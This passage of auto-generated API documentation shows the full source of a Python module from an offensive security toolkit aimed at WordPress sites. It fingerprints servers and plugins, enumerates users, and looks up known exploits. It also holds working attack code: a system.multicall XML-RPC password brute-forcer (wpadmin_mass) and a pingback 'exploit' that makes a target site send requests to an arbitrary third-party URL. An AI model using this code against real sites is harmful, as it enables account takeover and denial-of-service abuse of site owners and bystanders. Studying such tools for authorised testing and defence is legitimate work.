<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def get_wp_infos(u,max_wpscan_tries=3,cookie=None,user_agent=None,timeout=15,proxy=None,user_enum_start=1,user_enum_end=20,wpscan_cookie=None,sleep_time_min=10,sleep_time_max=20,when_blocked_sleep=30,logs=True,crt_timeout=120,wayback_timeout=120,subdomain_check_timeout=10,max_wayback_urls=10,subdomains_only=True,headers={},api_key=None):
    domain=u.split('://')[1].split('/')[0].split(':')[0]
    root_domain=extract_root_domain(domain)
    ip=socket.gethostbyname(domain.split(':')[0])
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    hed.update(headers)
    response = requests.Session().get(u, headers=hed, proxies=proxy, timeout=timeout, verify=False)
    server=response.headers.get('Server','')
    try:
        server_os=[x for x in server.split() if x.startswith('(')==True][0].replace('(','').replace(')','')
    except:
        server_os=''
    backend=response.headers.get('X-Powered-By','')
    html_content = response.text

    # Parse the HTML content
    soup = BeautifulSoup(html_content, 'html.parser')

    # Find themes and plugins information
    themes = []
    plugins = []
    try:
        #print(response.split('&lt;meta name="generator" content="')[1].split('"')[0])
        wp_version=response.text.lower().split('&lt;meta name="generator" content="wordpress')[1].split('"')[0].strip()
    except Exception as ex:
        #raise(ex)
        wp_version=''
    # Extract themes
    if logs==True:
        print("WordPress site info:\n\n\tURL: {}\n\tDomain: {}\n\tIP: {}\n\tServer: {}\n\tOS: {}\n\tBackend technology: {}\n\tWordPress version: {}\n".format(u,domain,ip,server,server_os,backend,wp_version))
    clickj=page_clickjacking(u,request_headers=response.headers)
    if logs==True:
        print("[i] Looking for subdomains...")
    subs=get_subdomains(root_domain,logs=logs, crt_timeout=crt_timeout,user_agent=user_agent,cookie=cookie,wayback_timeout=wayback_timeout,subdomain_check_timeout=subdomain_check_timeout,max_wayback_urls=max_wayback_urls,proxy=proxy,subdomains_only=subdomains_only)
    if logs==True:
        print("[i] Cheking if we can sniff some cookies over some links...")
        print()
    media_non_ssl=sniffable_links(u,content=response.text,logs=logs,request_headers=response.headers)
    if logs==True:
        print()
    theme_links = soup.find_all('link', rel='stylesheet')
    for link in theme_links:
        href = link.get('href')
        #print(href)
        if 'themes' in href:
            try:
                theme_name = href.split('/themes/')[1].split('/')[0]
                try:
                    version=href.split('?')[1].split('=')[1]
                except:
                    version=''
                theme={'name':theme_name,'version':version}
                if theme not in themes:
                    themes.append(theme)
            except:
                pass
        elif 'plugins' in href:
            try:
                plugin_name = href.split('/plugins/')[1].split('/')[0]
                try:
                    version=href.split('?')[1].split('=')[1]
                except:
                    version=''
                plugin={'name':plugin_name,'version':version}
                if plugin not in plugins:
                    plugins.append(plugin)
            except:
                pass
    users_json_exposed=True
    json_path=u+'/wp-json/wp/v2/users'
    if logs==True:
        print('[i] Fetching users from: {}'.format(json_path))
    json_users=wp_users(u,timeout=timeout,cookie=cookie,user_agent=user_agent,proxy=proxy,headers=headers)
    if logs==True:
        for x in json_users:
            print('\t[+] id: {} | name: {} | slug: {}'.format(x['id'],x['name'],x['slug']))
        print()
    if json_users==[]:
        users_json_exposed=False
    can_enumerate_users=True
    if logs==True:
        print('[i] Trying enumerating the authors...')
    enumerated_users= wp_users_enumeration(u,logs=logs,timeout=timeout,cookie=cookie,user_agent=user_agent,proxy=proxy,start=user_enum_start,end=user_enum_end,headers=headers)
    if enumerated_users==[]:
        can_enumerate_users=False
    else:
        if logs==True:
            print()
            for x in enumerated_users:
                print('\t[+] id: {} | name: {} | slug: {}'.format(x['id'],x['name'],x['slug']))
    if logs==True:
        print()
        print('[i] Checking if XMLRPC is enabled from: {}'.format(u+'/xmlrpc.php'))
    xmlrpcs=wp_xmlrpc_methods(u,timeout=timeout,cookie=cookie,user_agent=user_agent,proxy=proxy,headers=headers)
    can_b_u=("wp.getUsersBlogs" in xmlrpcs) and ("system.multicall" in xmlrpcs)
    can_pb="pingback.ping" in xmlrpcs
    if logs==True:
        if len(xmlrpcs)&gt;0:
            print('[+] enabled')
            if can_b_u==True:
                print('\t[+] Vulnerable to users bruteforce')
            if can_pb==True:
                print('\t[+] Vulnerable to pingback')
        else:
            print('\t[-] disabled')
        print()
    wp_vulns=[]
    if wp_version!='':
        if logs==True:
            print('[i] looking for exploits for version: {}\n'.format(wp_version))
        wpvulns=vulners_search('wordpress',version=wp_version,proxy=proxy,api_key=api_key)
        for x in wpvulns:
            if 'wordpress' in x['title'].lower() or 'wordpress' in x['description'].lower():
                wp_vulns.append(x)
        for x in wp_vulns:
            for i in ['cpe', 'cpe23', 'cwe', 'affectedSoftware']:
                try:
                    del x[i]
                except:
                    pass
        if logs==True:
            if len(wp_vulns)==0:
                print('\t[-] none was found')
            else:
                for x in wp_vulns:
                    print("\tTitle : {}\n\tDescription: {}\n\tLink: {}".format(x['title'],x['description'],x['href']))
                    print()
    backend_technology_exploits={}
    if backend!='':
        bk=[]
        for back in backend.split():
            if logs==True:
                print('[i] looking for exploits for : {}\n'.format(back))
            if '/' not in back:
                if logs==True:
                    print('\t[-] unknown version\n')
            else:
                bk=vulners_search(back.split('/')[0].lower(),version=back.split('/')[1],proxy=proxy,api_key=api_key)
            for x in bk:
                for i in ['cpe', 'cpe23', 'cwe', 'affectedSoftware']:
                    try:
                        del x[i]
                    except:
                        pass
            backend_technology_exploits.update({back:bk})
            if logs==True:
                if len(bk)==0:
                    print('\t[-] none was found')
                else:
                    for x in bk:
                        print("\tTitle : {}\n\tDescription: {}\n\tLink: {}".format(x['title'],x['description'],x['href']))
                        print()
    server_exploits={}
    if server!='':
        for sv in server.split():
            if sv.startswith('(')==False:
                sv_e=[]
                if logs==True:
                    print('[i] looking for exploits for : {}\n'.format(sv))
                if '/' in sv:
                    sv_e=vulners_search(sv.split('/')[0].lower(),version=sv.split('/')[1],proxy=proxy,api_key=api_key)
                else:
                    if logs==True:
                        print('\t[-] unknown version\n')
                for x in sv_e:
                    for i in ['cpe', 'cpe23', 'cwe', 'affectedSoftware']:
                        try:
                            del x[i]
                        except:
                            pass
                server_exploits.update({sv:sv_e})
                if logs==True:
                    if len(sv_e)==0:
                        print('\t[-] none was found')
                    else:
                        for x in sv_e:
                            print("\tTitle : {}\n\tDescription: {}\n\tLink: {}".format(x['title'],x['description'],x['href']))
                            print()
    if len(themes)&gt;0:
        if logs==True:
            print('[i] looking for exploits for the themes:\n')
    for x in themes:
        if logs==True:
            print('[i] Theme: {} | Version: {}\n'.format(x['name'],x['version']))
        x['exploits']=fetch_wp_exploits(x,max_tries=max_wpscan_tries,proxy=proxy,user_agent=user_agent,timeout=timeout,cookie=wpscan_cookie,sleep_time_min=sleep_time_min,sleep_time_max=sleep_time_max,when_blocked_sleep=when_blocked_sleep)
        if logs==True:
            for i in x['exploits']:
                print("\tTitle: {}\n\tLink: {}".format(i['title'],i['exploit_url']))
                print()
    if len(plugins)&gt;0:
        if logs==True:
            print()
            print('[i] looking for exploits for the plugins:\n')
    for x in plugins:
        if logs==True:
            print('[i] Plugin: {} | Version: {}\n'.format(x['name'],x['version']))
        x['exploits']=fetch_wp_exploits(x,max_tries=max_wpscan_tries,proxy=proxy,user_agent=user_agent,timeout=timeout,cookie=wpscan_cookie,sleep_time_min=sleep_time_min,sleep_time_max=sleep_time_max,when_blocked_sleep=when_blocked_sleep)
        if logs==True:
            for i in x['exploits']:
                print("\tTitle: {}\n\tLink: {}".format(i['title'],i['exploit_url']))
                print()
    return {'url':u,'domain':domain,'ip':ip,'root_domain':root_domain,'sub_domains':subs,'server':server,'os':server_os,'backend_technology':backend,'wordpress_version':wp_version,'sniffable_links':media_non_ssl,'clickjackable':clickj,'themes':themes,'plugins':plugins,'users_json_exposed':users_json_exposed,'exopsed_json_users':{'users':json_users,'path':json_path},'can_enumerate_users':can_enumerate_users,'enumerated_users':enumerated_users,'enabled_xmlrpc_methods':xmlrpcs,"xmlrpc_bruteforce_users":can_b_u,"pingback_enabled":can_pb,"exploits":wp_vulns,'backend_technology_exploits':backend_technology_exploits,'server_exploits':server_exploits}</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.version_string_to_list"><code class="name flex">
<span>def <span class="ident">version_string_to_list</span></span>(<span>version)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def version_string_to_list(version):
    return [int(x) for x in version.split('.')]</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.wp_user"><code class="name flex">
<span>def <span class="ident">wp_user</span></span>(<span>u, path='/wp-json/wp/v2/users/', user=1, user_agent=None, cookie=None, timeout=10, proxy=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"><p>this function is to return all informations about a WP user with a given index integer</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def wp_user(
    u,
    path="/wp-json/wp/v2/users/",
    user=1,
    user_agent=None,
    cookie=None,
    timeout=10,
    proxy=None,
    headers={}
):
    """
    this function is to return all informations about a WP user with a given index integer"""
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    hed.update(headers)
    u += path + str(user)
    try:
        r = requests.Session().get(u, headers=hed, proxies=proxy, timeout=timeout, verify=False)
        if ('{"id":' in r.text) and ('"name":"' in r.text):
            return json.loads(r.text)
    except Exception as e:
        pass</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.wp_users"><code class="name flex">
<span>def <span class="ident">wp_users</span></span>(<span>u, path='/wp-json/wp/v2/users', timeout=10, user_agent=None, cookie=None, proxy=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"><p>this function is to get WP users</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def wp_users(
    u, path="/wp-json/wp/v2/users", timeout=10, user_agent=None, cookie=None, proxy=None, headers={}
):
    """
    this function is to get WP users"""
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    hed.update(headers)
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    u += path
    try:
        r = requests.Session().get(u, headers=hed, proxies=proxy, timeout=timeout, verify=False)
        if ('{"id":' in r.text) and ('"name":"' in r.text):
            a = json.loads(r.text)
            users = []
            for x in range(len(a)):
                users.append(
                    {"id": a[x]["id"], "slug": a[x]["slug"], "name": a[x]["name"]}
                )
            return users
    except Exception as e:
        return []
    return []</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.wp_users_enumeration"><code class="name flex">
<span>def <span class="ident">wp_users_enumeration</span></span>(<span>u, path='/', timeout=15, user_agent=None, cookie=None, proxy=None, start=1, end=20, logs=True, headers={})</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def wp_users_enumeration(
    u,
    path="/",
    timeout=15,
    user_agent=None,
    cookie=None,
    proxy=None,
    start=1,
    end=20,
    logs=True,
    headers={}
):
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    hed.update(headers)
    d = u.split("://")[1].split("/")[0]
    u = u.split(d)[0] + d
    l = []
    for x in range(start, end + 1):
        try:
            r = requests.Session().get(
                u + path + "?author=" + str(x),
                headers=hed,
                proxies=proxy,
                timeout=timeout,
                verify=False,
            ).text
            a = r.split('&lt;meta property="og:title" content="')[1].split("&gt;")[0]
            b=r.split('&lt;meta property="og:url" content="')[1].split("&gt;")[0]
            c=b.split('/author/')[1].split('/')[0]
            if "," in a:
                a = a.split(",")[0]
                l.append({'id':x, 'name':a,'slug':c})
                if logs == True:
                    print(
                        "\t[+] id: {} | name: {} | slug: {}".format(
                            x,#.encode("utf-8", "replace"), 
                            a,
                            c
                        )
                    )
        except KeyboardInterrupt:
            break
        except:
            pass
    return l</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.wp_version"><code class="name flex">
<span>def <span class="ident">wp_version</span></span>(<span>u, timeout=15, user_agent=None, cookie=None, proxy=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def wp_version(u, timeout=15, user_agent=None, cookie=None, proxy=None,headers={}):
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    hed.update(headers)
    try:
        r = requests.Session().get(
            u, headers=hed, proxies=proxy, timeout=timeout, verify=False
        ).text
        return (
            r.split('&lt;meta name="generator" content="')[1]
            .split('"')[0]
            .strip()
            .split(" ")[1]
        )
    except:
        pass</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.wp_xmlrpc_bruteforce"><code class="name flex">
<span>def <span class="ident">wp_xmlrpc_bruteforce</span></span>(<span>u, user_agent=None, cookie=None, path='/xmlrpc.php', timeout=10, proxy=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def wp_xmlrpc_bruteforce(
    u, user_agent=None, cookie=None, path="/xmlrpc.php", timeout=10, proxy=None,headers={}
):
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    hed.update(headers)
    u += path
    post = """
 &lt;?xml version="1.0" encoding="utf-8"?&gt; 
&lt;methodCall&gt; 
&lt;methodName&gt;system.listMethods&lt;/methodName&gt; 
&lt;params&gt;&lt;/params&gt; 
&lt;/methodCall&gt;
"""
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        if "wp.getUsersBlogs" in [
            x.replace("&lt;/string&gt;&lt;/value&gt;", "").replace("&lt;value&gt;&lt;string&gt;", "").strip()
            for x in r.text.split("&lt;data&gt;")[1].split("&lt;/data&gt;")[0].strip().split("\n")
        ]:
            return True
    except:
        pass
    return False</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.wp_xmlrpc_mass_bruteforce"><code class="name flex">
<span>def <span class="ident">wp_xmlrpc_mass_bruteforce</span></span>(<span>u, user_agent=None, cookie=None, path='/xmlrpc.php', timeout=10, proxy=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def wp_xmlrpc_mass_bruteforce(
    u, user_agent=None, cookie=None, path="/xmlrpc.php", timeout=10, proxy=None, headers={}
):
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    hed.update(headers)
    u += path
    post = """
 &lt;?xml version="1.0" encoding="utf-8"?&gt; 
&lt;methodCall&gt; 
&lt;methodName&gt;system.listMethods&lt;/methodName&gt; 
&lt;params&gt;&lt;/params&gt; 
&lt;/methodCall&gt;
"""
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        l = [
            x.replace("&lt;/string&gt;&lt;/value&gt;", "").replace("&lt;value&gt;&lt;string&gt;", "").strip()
            for x in r.text.split("&lt;data&gt;")[1].split("&lt;/data&gt;")[0].strip().split("\n")
        ]
        if ("wp.getUsersBlogs" in l) and ("system.multicall" in l):
            return True
    except:
        pass
    return False</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.wp_xmlrpc_methods"><code class="name flex">
<span>def <span class="ident">wp_xmlrpc_methods</span></span>(<span>u, user_agent=None, cookie=None, path='/xmlrpc.php', timeout=10, proxy=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def wp_xmlrpc_methods(
    u, user_agent=None, cookie=None, path="/xmlrpc.php", timeout=10, proxy=None,headers={}
):
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    hed.update(headers)
    u += path
    post = """
 &lt;?xml version="1.0" encoding="utf-8"?&gt; 
&lt;methodCall&gt; 
&lt;methodName&gt;system.listMethods&lt;/methodName&gt; 
&lt;params&gt;&lt;/params&gt; 
&lt;/methodCall&gt;
"""
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        return [
            x.replace("&lt;/string&gt;&lt;/value&gt;", "").replace("&lt;value&gt;&lt;string&gt;", "").strip()
            for x in r.text.split("&lt;data&gt;")[1].split("&lt;/data&gt;")[0].strip().split("\n")
        ]
    except:
        pass
    return []</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.wp_xmlrpc_pingback"><code class="name flex">
<span>def <span class="ident">wp_xmlrpc_pingback</span></span>(<span>u, user_agent=None, test_url='https://www.google.com/', cookie=None, path='/xmlrpc.php', timeout=10, proxy=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def wp_xmlrpc_pingback(
    u,
    user_agent=None,
    test_url="https://www.google.com/",
    cookie=None,
    path="/xmlrpc.php",
    timeout=10,
    proxy=None,
    headers={}
):
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    hed.update(headers)
    u += path
    post = """
 &lt;?xml version="1.0" encoding="utf-8"?&gt; 
&lt;methodCall&gt; 
&lt;methodName&gt;system.listMethods&lt;/methodName&gt; 
&lt;params&gt;&lt;/params&gt; 
&lt;/methodCall&gt;
"""
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        l = [
            x.replace("&lt;/string&gt;&lt;/value&gt;", "").replace("&lt;value&gt;&lt;string&gt;", "").strip()
            for x in r.text.split("&lt;data&gt;")[1].split("&lt;/data&gt;")[0].strip().split("\n")
        ]
        if "pingback.ping" in l:
            return True
    except:
        pass
    return False</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.wp_xmlrpc_pingback_exploit"><code class="name flex">
<span>def <span class="ident">wp_xmlrpc_pingback_exploit</span></span>(<span>u, user_agent=None, target_url='https://www.google.com/', cookie=None, path='/xmlrpc.php', timeout=10, proxy=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def wp_xmlrpc_pingback_exploit(
    u,
    user_agent=None,
    target_url="https://www.google.com/",
    cookie=None,
    path="/xmlrpc.php",
    timeout=10,
    proxy=None,
    headers={}
):
    url = u.split("://")[0] + "://" + urlparse(u).netloc
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    hed.update(headers)
    url += path
    post = (
        """&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;methodCall&gt;
&lt;methodName&gt;pingback.ping&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;
&lt;value&gt;&lt;string&gt;"""
        + target_url
        + """&lt;/string&gt;&lt;/value&gt;
&lt;/param&gt;
&lt;param&gt;
&lt;value&gt;&lt;string&gt;"""
        + u
        + """&lt;/string&gt;&lt;/value&gt;
&lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;
"""
    )
    try:
        r = requests.Session().post(
            url, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
    except:
        pass</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.wpadmin"><code class="name flex">
<span>def <span class="ident">wpadmin</span></span>(<span>u, username, password, user_agent=None, cookie=None, path='/xmlrpc.php', timeout=10, proxy=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"><p>this function is to check the wordpress given logins using the xmlrpc.php file. if they are correct it returns True, else False</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def wpadmin(
    u,
    username,
    password,
    user_agent=None,
    cookie=None,
    path="/xmlrpc.php",
    timeout=10,
    proxy=None,
    headers={}
):
    """
    this function is to check the wordpress given logins using the xmlrpc.php file. if they are correct it returns True, else False"""
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    hed.update(headers)
    u += path
    post = """&lt;methodCall&gt;
&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;&lt;value&gt;{}&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;&lt;value&gt;{}&lt;/value&gt;&lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;""".format(
        username, password
    )
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        if "isAdmin" in r.text:
            return True
    except:
        pass
    return False</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.wpadmin_mass"><code class="name flex">
<span>def <span class="ident">wpadmin_mass</span></span>(<span>u, word_list=[], user_agent=None, cookie=None, path='/xmlrpc.php', timeout=10, proxy=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"><p>this function is to check the wordpress given logins using the xmlrpc.php file. if they are correct it returns True, else False</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def wpadmin_mass(
    u,
    word_list=[],
    user_agent=None,
    cookie=None,
    path="/xmlrpc.php",
    timeout=10,
    proxy=None,
    headers={}
):
    """
    this function is to check the wordpress given logins using the xmlrpc.php file. if they are correct it returns True, else False"""
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    hed.update(headers)
    u += path
    post = """
 &lt;?xml version="1.0"?&gt;
&lt;methodCall&gt;&lt;methodName&gt;system.multicall&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;
 """
    for x in word_list:
        post += """&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;&lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;
  &lt;data&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;string&gt;{}&lt;/string&gt;&lt;/value&gt;&lt;value&gt;&lt;string&gt;{}&lt;/string&gt;&lt;/value&gt;
  &lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;
""".format(
            x.split(":")[0], x.split(":")[1]
        )
    post += """
&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;
 """
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        l = (
            r.text.split("&lt;array&gt;&lt;data&gt;")[1]
            .split("&lt;/array&gt;&lt;/data&gt;")[0]
            .strip()
            .split("&lt;/struct&gt;&lt;/value&gt;")
        )
        for x in l:
            if "Incorrect username or password" not in x:
                return word_list[l.index(x)]
    except:
        pass
    return ""</code></pre>
</details>
</dd>
</dl>
</section>
<section>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a href="index.md" title="bane.scanners.cms">bane.scanners.cms</a></code></li>
</ul>
</li>
<li><h3><a href="#header-functions">Functions</a></h3>
<ul class="">
<li><code><a href="#bane.scanners.cms.wp.extract_with_versions" title="bane.scanners.cms.wp.extract_with_versions">extract_with_versions</a></code></li>
<li><code><a href="#bane.scanners.cms.wp.fetch_wp_exploits" title="bane.scanners.cms.wp.fetch_wp_exploits">fetch_wp_exploits</a></code></li>
<li><code><a href="#bane.scanners.cms.wp.get_wp_infos" title="bane.scanners.cms.wp.get_wp_infos">get_wp_infos</a></code></li>
<li><code><a href="#bane.scanners.cms.wp.version_string_to_list" title="bane.scanners.cms.wp.version_string_to_list">version_string_to_list</a></code></li>
<li><code><a href="#bane.scanners.cms.wp.wp_user" title="bane.scanners.cms.wp.wp_user">wp_user</a></code></li>
<li><code><a href="#bane.scanners.cms.wp.wp_users" title="bane.scanners.cms.wp.wp_users">wp_users</a></code></li>
<li><code><a href="#bane.scanners.cms.wp.wp_users_enumeration" title="bane.scanners.cms.wp.wp_users_enumeration">wp_users_enumeration</a></code></li>
<li><code><a href="#bane.scanners.cms.wp.wp_version" title="bane.scanners.cms.wp.wp_version">wp_version</a></code></li>
<li><code><a href="#bane.scanners.cms.wp.wp_xmlrpc_bruteforce" title="bane.scanners.cms.wp.wp_xmlrpc_bruteforce">wp_xmlrpc_bruteforce</a></code></li>
<li><code><a href="#bane.scanners.cms.wp.wp_xmlrpc_mass_bruteforce" title="bane.scanners.cms.wp.wp_xmlrpc_mass_bruteforce">wp_xmlrpc_mass_bruteforce</a></code></li>
<li><code><a href="#bane.scanners.cms.wp.wp_xmlrpc_methods" title="bane.scanners.cms.wp.wp_xmlrpc_methods">wp_xmlrpc_methods</a></code></li>
<li><code><a href="#bane.scanners.cms.wp.wp_xmlrpc_pingback" title="bane.scanners.cms.wp.wp_xmlrpc_pingback">wp_xmlrpc_pingback</a></code></li>
<li><code><a href="#bane.scanners.cms.wp.wp_xmlrpc_pingback_exploit" title="bane.scanners.cms.wp.wp_xmlrpc_pingback_exploit">wp_xmlrpc_pingback_exploit</a></code></li>
<li><code><a href="#bane.scanners.cms.wp.wpadmin" title="bane.scanners.cms.wp.wpadmin">wpadmin</a></code></li>
<li><code><a href="#bane.scanners.cms.wp.wpadmin_mass" title="bane.scanners.cms.wp.wpadmin_mass">wpadmin_mass</a></code></li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
</footer>
</body>
</html>